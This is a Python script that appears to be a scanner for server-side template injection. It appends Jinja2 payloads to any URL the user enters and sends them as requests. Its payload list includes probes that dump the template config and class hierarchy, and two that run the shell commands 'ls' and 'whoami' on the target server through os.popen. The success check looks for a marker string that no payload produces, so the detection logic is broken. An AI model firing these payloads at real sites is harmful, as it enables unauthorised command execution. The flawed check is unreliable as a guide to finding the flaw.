import requests
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored terminal output
init()

# Function to test SSTI vulnerability
def test_ssti(url, payload):
    try:
        # Craft the payload
        payload_url = url + payload

        # Send a GET request with the crafted payload
        response = requests.get(payload_url)

        # Check if the response status code indicates success (2xx)
        if response.ok:
            # Check if the response contains the expected output indicating SSTI
            if "SSTI_TEST_SUCCESSFUL" in response.text:
                print(Fore.GREEN + "[+] Potential SSTI vulnerability found at:", url)
            else:
                print(Fore.RED + "[-] No SSTI vulnerability found at:", url)
        else:
            print(Fore.YELLOW + "[-] Error:", response.status_code)
    except Exception as e:
        print(Fore.RED + "[-] An error occurred:", str(e))

# Main function
def main():
    try:
        # Prompt the user to input the target website URL
        target_url = input("Enter your target website URL: ")

        # Payloads to inject
        payloads = [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
            "{{7*'a'}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
            # Add more payloads here for better coverage
        ]

        print(Style.RESET_ALL + "[*] Testing for SSTI vulnerability on:", target_url)

        # Test each payload
        for payload in payloads:
            print(Style.RESET_ALL + "[*] Testing payload:", payload)
            test_ssti(target_url, payload)

    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[-] User interrupted")

# Entry point of the program
if __name__ == "__main__":
    main()
